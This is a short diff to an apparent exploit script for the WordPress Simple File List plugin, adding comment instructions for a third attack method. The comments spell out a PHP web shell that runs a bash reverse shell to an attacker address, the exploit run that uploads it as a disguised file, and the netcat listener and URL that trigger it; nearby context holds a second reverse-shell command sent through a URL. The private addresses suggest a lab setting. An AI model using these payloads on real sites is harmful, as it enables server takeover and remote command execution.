@@ -41,6 +41,17 @@
 # 4. nc -lvnp 80
 # 5. http://192.168.68.105/wp-content/uploads/simple-file-list/cmd.php?cmd=/bin/bash -i >& /dev/tcp/192.168.49.68/80 0>&1     (URL encode it)
 
+# Method 3
+# 1. Create a php file in the same folder as the exploit containg php code.  nano test.php    <-- <?php passthru("bash -i >& /dev/tcp/192.168.49.68/80 0>&1"); ?>
+# 2. python exploit.py $IP
+#    [*] Enter File Name (working directory): test.php
+#    [*] Enter protocol (http/https): http
+#    [+] File renamed to cmd.png
+#    [^-^] Exploit seems to have worked...
+#        URL: http://192.168.68.105/wp-content/uploads/simple-file-list/test.php
+### Shell it
+# 3. nc -lvnp 80
+# 4. http://192.168.68.105/wp-content/uploads/simple-file-list/test.php
 
 
 import requests
